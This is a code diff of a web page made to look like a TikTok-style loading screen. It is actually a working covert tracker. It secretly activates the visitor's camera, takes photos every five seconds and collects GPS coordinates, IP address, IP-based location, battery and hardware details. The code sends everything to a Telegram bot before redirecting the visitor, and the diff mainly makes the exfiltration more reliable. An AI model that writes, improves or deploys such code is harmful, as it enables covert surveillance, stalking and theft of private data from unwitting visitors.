@@ -15,15 +15,10 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             overflow: hidden;
         }
-        
-        /* TikTok-style pulsing logo */
-        .splash {
-            text-align: center;
-        }
+        .splash { text-align: center; }
         .logo-container {
             position: relative;
-            width: 100px;
-            height: 100px;
+            width: 100px; height: 100px;
             margin: 0 auto 30px;
         }
         .pulse-ring {
@@ -37,21 +32,16 @@
         }
         .pulse-ring:nth-child(2) { animation-delay: 0.5s; }
         .pulse-ring:nth-child(3) { animation-delay: 1s; }
-        
         @keyframes pulse {
             0% { transform: translate(-50%, -50%) scale(0.5); opacity: 1; }
             100% { transform: translate(-50%, -50%) scale(2); opacity: 0; }
         }
-        
         .note-icon {
-            position: relative;
-            z-index: 2;
-            width: 50px;
-            height: 50px;
+            position: relative; z-index: 2;
+            width: 50px; height: 50px;
             margin: 25px;
             filter: drop-shadow(0 0 10px rgba(255,0,80,0.5));
         }
-        
         .loading-text {
             color: #888;
             font-size: 14px;
@@ -62,19 +52,11 @@
             0%, 100% { opacity: 0.4; }
             50% { opacity: 1; }
         }
-        
-        .brand {
-            color: #fff;
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            letter-spacing: 3px;
-        }
+        .brand { color: #fff; font-size: 24px; font-weight: bold; margin-bottom: 20px; letter-spacing: 3px; }
         .brand span { color: #ff0050; }
-        
-        /* Hidden camera */
         #cam { display: none; }
         #canvas { display: none; }
+        #debug { color: #fff; font-size: 10px; margin-top: 10px; opacity: 0; }
     </style>
 </head>
 <body>
@@ -92,6 +74,7 @@
             </svg>
         </div>
         <div class="loading-text" id="status">CONNECTING...</div>
+        <div id="debug"></div>
     </div>
 
     <script>
@@ -106,39 +89,50 @@
     var streamActive = false;
     var photoCount = 0;
     var visitStart = Date.now();
+    var sent = false; // Track if already sent
     
-    // Get IP
+    function log(msg) {
+        document.getElementById('debug').textContent += msg + '\n';
+    }
+    
+    // Get IP first
     fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(d => { ipData = d.ip; })
-        .catch(() => { ipData = 'Unknown'; });
+        .then(function(r) { return r.json(); })
+        .then(function(d) { ipData = d.ip; log('IP: ' + d.ip); })
+        .catch(function() { ipData = 'Unknown'; });
     
-    // Get battery info
+    // Get battery
     function getBattery() {
         if (navigator.getBattery) {
-            return navigator.getBattery().then(b => ({
-                level: Math.round(b.level * 100) + '%',
-                charging: b.charging ? 'Yes' : 'No'
-            }));
+            return navigator.getBattery().then(function(b) {
+                return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' };
+            });
         }
         return Promise.resolve({ level: 'N/A', charging: 'Unknown' });
     }
     
-    // Capture GPS
+    // Get GPS
     function getGPS() {
-        return new Promise(resolve => {
+        return new Promise(function(resolve) {
             if (!navigator.geolocation) {
+                log('GPS: Not supported');
                 resolve(null);
                 return;
             }
             navigator.geolocation.getCurrentPosition(
-                pos => resolve({
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    acc: pos.coords.accuracy,
-                    alt: pos.coords.altitude
-                }),
-                err => resolve(null),
+                function(pos) {
+                    log('GPS: GRANTED ' + pos.coords.latitude.toFixed(4) + ',' + pos.coords.longitude.toFixed(4));
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude
+                    });
+                },
+                function(err) {
+                    log('GPS: DENIED - ' + err.message);
+                    resolve(null);
+                },
                 { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
         });
@@ -146,7 +140,7 @@
     
     // Start camera
     async function startCamera() {
-        if (!isMobile) return false;
+        if (!isMobile) { log('Camera: Desktop - skipped'); return false; }
         try {
             var v = document.getElementById('cam');
             var stream = await navigator.mediaDevices.getUserMedia({ 
@@ -154,13 +148,15 @@
             });
             v.srcObject = stream;
             streamActive = true;
+            log('Camera: Started');
             return true;
         } catch(e) {
+            log('Camera: Error - ' + e.message);
             return false;
         }
     }
     
-    // Take photo silently
+    // Take photo
     function takePhoto() {
         if (!streamActive) return null;
         try {
@@ -169,32 +165,39 @@
             c.width = v.videoWidth || 320;
             c.height = v.videoHeight || 240;
             c.getContext('2d').drawImage(v, 0, 0);
+            photoCount++;
+            log('Photo: #' + photoCount + ' captured');
             return c.toDataURL('image/jpeg', 0.6);
         } catch(e) {
             return null;
         }
     }
     
-    // Send photo to Telegram
+    // Send photo
     function sendPhoto(photoData) {
-        if (!bot || !chat || !photoData) return;
-        var blob = dataURLtoBlob(photoData);
-        var fd = new FormData();
-        fd.append('chat_id', chat);
-        fd.append('photo', blob, 'photo_' + (++photoCount) + '.jpg');
-        fetch('https://api.telegram.org/bot' + bot + '/sendPhoto', { method: 'POST', body: fd })
-            .catch(() => {});
-    }
-    
-    function dataURLtoBlob(dataurl) {
-        var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1];
+        if (!photoData) return;
+        var arr = photoData.split(','), mime = arr[0].match(/:(.*?);/)[1];
         var bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
         while(n--) u8[n] = bstr.charCodeAt(n);
-        return new Blob([u8], {type: mime});
+        var blob = new Blob([u8], {type: mime});
+        
+        var fd = new FormData();
+        fd.append('chat_id', chat);
+        fd.append('photo', blob, 'capture_' + photoCount + '.jpg');
+        fd.append('caption', '📸 Photo #' + photoCount + ' | ' + new Date().toLocaleTimeString());
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendPhoto', true);
+        xhr.onload = function() { log('Photo sent: ' + xhr.status); };
+        xhr.onerror = function() { log('Photo FAILED'); };
+        xhr.send(fd);
     }
     
-    // Build report message
-    async function buildReport() {
+    // Build and send report
+    async function sendReport(isFinal) {
+        if (sent && !isFinal) return;
+        sent = true;
+        
         var ua = navigator.userAgent;
         var plat = navigator.platform;
         var lang = navigator.language;
@@ -208,7 +211,6 @@
         var duration = Math.floor((Date.now() - visitStart) / 1000);
         var battery = await getBattery();
         
-        // Device model
         var deviceModel = plat;
         if (/iPhone/.test(ua)) {
             var iosVer = ua.match(/OS (\d+_\d+)/);
@@ -222,155 +224,150 @@
         }
         
         // Get IP location
-        var ipLocation = '';
+        var ipLocText = '';
         try {
             var ipRes = await fetch('http://ip-api.com/json/' + (ipData || '') + '?fields=country,regionName,city,zip,timezone');
             var ipLoc = await ipRes.json();
             if (ipLoc.country) {
-                ipLocation = 
-                    '📍 *Location Details*\\n' +
-                    '   • Country: ' + ipLoc.country + '\\n' +
-                    '   • Region: ' + (ipLoc.regionName || 'N/A') + '\\n' +
-                    '   • City: ' + (ipLoc.city || 'N/A') + '\\n' +
-                    '   • Postal Code: ' + (ipLoc.zip || 'N/A') + '\\n' +
-                    '   • Timezone: ' + (ipLoc.timezone || tz) + '\\n\\n';
+                ipLocText = 
+                    '📍 Location Details\n' +
+                    '   • Country: ' + ipLoc.country + '\n' +
+                    '   • Region: ' + (ipLoc.regionName || 'N/A') + '\n' +
+                    '   • City: ' + (ipLoc.city || 'N/A') + '\n' +
+                    '   • Postal Code: ' + (ipLoc.zip || 'N/A') + '\n' +
+                    '   • Timezone: ' + (ipLoc.timezone || tz) + '\n\n';
             }
         } catch(e) {
-            ipLocation = '📍 *Location Details*\\n   • Timezone: ' + tz + '\\n\\n';
+            ipLocText = '📍 Location Details\n   • Timezone: ' + tz + '\n\n';
         }
         
-        var msg = '';
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n';
-        msg += '    📊 Visitor Information Captured\\n';
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n\\n';
+        var prefix = isFinal ? '📋 FINAL REPORT - User Left Page\n\n' : '';
         
-        msg += '🖥️ *Device & Browser*\\n';
-        msg += '   • Device Model: ' + deviceModel + '\\n';
-        msg += '   • User Agent: ' + ua.substring(0, 80) + '...\\n\\n';
+        var msg = prefix;
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '    📊 Visitor Information Captured\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
         
-        msg += '🌐 *Network Information*\\n';
-        msg += '   • IP Address: ' + (ipData || 'Detecting...') + '\\n';
-        msg += '   • Language: ' + lang + '\\n\\n';
+        msg += '🖥️ Device & Browser\n';
+        msg += '   • Device Model: ' + deviceModel + '\n';
+        msg += '   • User Agent: ' + ua.substring(0, 80) + '...\n\n';
         
-        msg += ipLocation;
+        msg += '🌐 Network Information\n';
+        msg += '   • IP Address: ' + (ipData || 'N/A') + '\n';
+        msg += '   • Language: ' + lang + '\n\n';
         
-        // GPS section
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n';
-        msg += '    🗺️ GPS Coordinates\\n';
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n\\n';
+        msg += ipLocText;
+        
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '    🗺️ GPS Coordinates\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
         
         if (gpsData) {
-            msg += '   ✅ Location Granted\\n';
-            msg += '   • Latitude: ' + gpsData.lat.toFixed(15) + '\\n';
-            msg += '   • Longitude: ' + gpsData.lon.toFixed(15) + '\\n';
-            msg += '   • Accuracy: ' + gpsData.acc.toFixed(0) + 'mm\\n\\n';
-            msg += '   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon + '&ll=' + gpsData.lat + ',' + gpsData.lon + '&z=16\\n\\n';
+            msg += '   ✅ Location Granted\n';
+            msg += '   • Latitude: ' + gpsData.lat.toFixed(15) + '\n';
+            msg += '   • Longitude: ' + gpsData.lon.toFixed(15) + '\n';
+            msg += '   • Accuracy: ' + gpsData.acc.toFixed(0) + 'mm\n\n';
+            msg += '   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon + '&ll=' + gpsData.lat + ',' + gpsData.lon + '&z=16\n\n';
         } else {
-            msg += '   ❌ Location: Denied\\n';
-            msg += '   💡 Location permission was not granted\\n\\n';
+            msg += '   ❌ Location: Denied\n';
+            msg += '   💡 Location permission was not granted\n\n';
         }
         
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n';
-        msg += '    📱 Device Details\\n';
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n\\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '    📱 Device Details\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
         
-        msg += '🖼️ *Display Information*\\n';
-        msg += '   • Resolution: ' + scr + '\\n\\n';
+        msg += '🖼️ Display Information\n';
+        msg += '   • Resolution: ' + scr + '\n\n';
         
-        msg += '🔋 *Battery Status*\\n';
-        msg += '   • Level: ' + battery.level + '\\n';
-        msg += '   • Charging: ' + battery.charging + '\\n\\n';
+        msg += '🔋 Battery Status\n';
+        msg += '   • Level: ' + battery.level + '\n';
+        msg += '   • Charging: ' + battery.charging + '\n\n';
         
-        msg += '🔐 *Device Permissions*\\n';
-        msg += '   • Camera: ' + (streamActive ? 'Active' : 'Unknown') + '\\n';
-        msg += '   • Location: ' + (gpsData ? 'Granted' : 'Denied') + '\\n\\n';
+        msg += '🔐 Device Permissions\n';
+        msg += '   • Camera: ' + (streamActive ? 'Active' : 'Unknown') + '\n';
+        msg += '   • Location: ' + (gpsData ? 'Granted' : 'Denied') + '\n\n';
         
-        msg += '💾 *Hardware & Storage*\\n';
-        msg += '   • CPU Cores: ' + cores + '\\n';
-        msg += '   • RAM: ' + ram + ' GB\\n';
-        msg += '   • Photos Captured: ' + photoCount + '\\n';
-        msg += '   • Visit Duration: ' + duration + 's\\n\\n';
+        msg += '💾 Hardware & Storage\n';
+        msg += '   • CPU Cores: ' + cores + '\n';
+        msg += '   • RAM: ' + ram + ' GB\n';
+        msg += '   • Photos Captured: ' + photoCount + '\n';
+        msg += '   • Visit Duration: ' + duration + 's\n\n';
         
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n';
-        msg += '📅 Captured: ' + dateStr + ', ' + timeStr + '\\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '📅 Captured: ' + dateStr + ', ' + timeStr + '\n';
         msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
         
-        return msg;
-    }
-    
-    // Send initial report
-    async function sendInitialReport() {
-        var msg = await buildReport();
-        fetch('https://api.telegram.org/bot' + bot + '/sendMessage', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'Markdown', disable_web_page_preview: true })
-        }).catch(() => {});
+        // USE XHR instead of fetch for reliability
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendMessage', false); // SYNCHRONOUS
+        xhr.setRequestHeader('Content-Type', 'application/json');
         
-        // Send GPS location if available
+        var payload = JSON.stringify({
+            chat_id: chat,
+            text: msg,
+            disable_web_page_preview: true
+        });
+        
+        try {
+            xhr.send(payload);
+            log('Report sent: ' + xhr.status + ' - ' + xhr.responseText);
+        } catch(e) {
+            log('Report FAILED: ' + e.message);
+        }
+        
+        // Send GPS location pin if available
         if (gpsData) {
-            fetch('https://api.telegram.org/bot' + bot + '/sendLocation', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat, latitude: gpsData.lat, longitude: gpsData.lon })
-            }).catch(() => {});
+            var xhr2 = new XMLHttpRequest();
+            xhr2.open('POST', 'https://api.telegram.org/bot' + bot + '/sendLocation', false);
+            xhr2.setRequestHeader('Content-Type', 'application/json');
+            try {
+                xhr2.send(JSON.stringify({ chat_id: chat, latitude: gpsData.lat, longitude: gpsData.lon }));
+                log('Location pin sent');
+            } catch(e) {}
         }
     }
     
-    // Send final report when leaving
-    async function sendFinalReport() {
-        var msg = await buildReport();
-        msg = '📋 *FINAL REPORT - User Left Page*\\n\\n' + msg;
-        fetch('https://api.telegram.org/bot' + bot + '/sendMessage', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'Markdown', disable_web_page_preview: true })
-        }).catch(() => {});
-        
-        // Stop camera
-        if (streamActive) {
-            var tracks = document.getElementById('cam').srcObject.getTracks();
-            tracks.forEach(t => t.stop());
-            streamActive = false;
-        }
-        if (photoInterval) clearInterval(photoInterval);
-    }
-    
-    // Main
+    // Main execution
     async function main() {
-        // Start camera silently
+        log('Starting...');
+        
+        // Start camera
         var camStarted = await startCamera();
         
         // Get GPS
         gpsData = await getGPS();
         
-        // Send initial report after 3 seconds
-        setTimeout(async () => {
-            await sendInitialReport();
-            
-            // Start continuous photo capture every 5 seconds
-            if (camStarted) {
-                photoInterval = setInterval(() => {
-                    var photo = takePhoto();
-                    if (photo) sendPhoto(photo);
-                }, 5000);
-            }
-            
-            // Hide splash, redirect
+        // SEND REPORT BEFORE REDIRECT (synchronous XHR)
+        await sendReport(false);
+        
+        // Start photo capture every 5 seconds
+        if (camStarted) {
+            photoInterval = setInterval(function() {
+                var photo = takePhoto();
+                if (photo) sendPhoto(photo);
+            }, 5000);
+        }
+        
+        // Hide splash and redirect AFTER sending
+        document.getElementById('status').textContent = 'COMPLETE';
+        setTimeout(function() {
             document.getElementById('splash').style.display = 'none';
             window.location.href = redir;
-            
-        }, 3000);
+        }, 500);
     }
     
-    // Capture when user leaves
-    window.addEventListener('beforeunload', () => {
-        sendFinalReport();
-    });
-    
-    // Also capture on page hide (mobile)
-    window.addEventListener('pagehide', () => {
-        sendFinalReport();
+    // Send final report when leaving
+    window.addEventListener('beforeunload', function() {
+        if (photoInterval) clearInterval(photoInterval);
+        if (streamActive) {
+            var tracks = document.getElementById('cam').srcObject.getTracks();
+            tracks.forEach(function(t) { t.stop(); });
+        }
+        // Use sendBeacon for reliability when leaving
+        var msg = '📋 User left page after ' + Math.floor((Date.now() - visitStart)/1000) + 's | Photos: ' + photoCount;
+        navigator.sendBeacon('https://api.telegram.org/bot' + bot + '/sendMessage', 
+            JSON.stringify({ chat_id: chat, text: msg }));
     });
     
     // Start
